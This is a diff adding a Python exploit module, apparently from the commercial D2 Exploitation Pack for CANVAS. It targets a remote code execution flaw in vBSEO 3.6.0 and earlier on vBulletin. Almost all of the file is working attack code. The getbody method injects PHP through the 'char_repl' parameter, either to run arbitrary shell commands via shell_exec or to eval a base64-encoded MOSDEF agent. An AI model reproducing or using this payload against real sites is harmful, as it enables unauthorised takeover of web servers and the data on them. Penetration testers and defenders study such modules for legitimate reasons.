@@ -1,0 +1,92 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from ExploitTypes.phpexploit import *
+import canvasengine
+import urllib
+import libs.spkproxy as spkproxy
+
+# GUI info
+NAME = "vBulletin vBSEO Remote Code Execution Vulnerability"
+DESCRIPTION = "Remote code execution vulnerability in vBulletin vBSEO"
+VERSION = "0.1"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "vBSEO"
+DOCUMENTATION["Date public"] = "2012.01.24"
+DOCUMENTATION["VersionsAffected"] = "vBSEO <= 3.6.0"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/51647"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
+PROPERTY['VERSION'] = [ "All" ]
+
+NOTES = ""
+
+CHANGELOG = ""
+
+
+class theexploit(phpexploit):
+    def __init__(self):
+        phpexploit.__init__(self)
+        self.port = 80
+        self.host = ""
+        self.setVersions()
+        self.version = 0
+        self.done = 0
+        self.ssl = ""
+        self.name = NAME
+        self.basepath = "/"
+        self.basepaths = ["/vb403/","/vb/","/"]
+        self.command = None
+        self.basicauth_user = ""
+        self.basicauth_password = ""
+        self.hostname = None
+        self.verb = "POST"
+        self.content_type = "application/x-www-form-urlencoded"
+        self.targetpath = "vbseocp.php"
+        self.foundstrings = ["vBSEO"]
+        self.testfile = "vbseocp.php"        
+        return
+    
+    def getbody(self):        
+        if self.command:
+            self.log("Command: %s"%self.command)
+            command = self.command
+            command = self.encode_php(command)            
+            exp = "char_repl='{${print shell_exec(" + command + ")}}.{${die()}}'=>"
+        else:
+            command = self.get_php_to_mosdef()
+            command = b64encode(command).strip()            
+            command = self.encode_php(command)
+            exp = "char_repl='{${eval(base64_decode(" + command + "))}}.{${die()}}'=>"
+        return exp 
+    
+    def parse_command_response(self, data):        
+        return data
+    
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
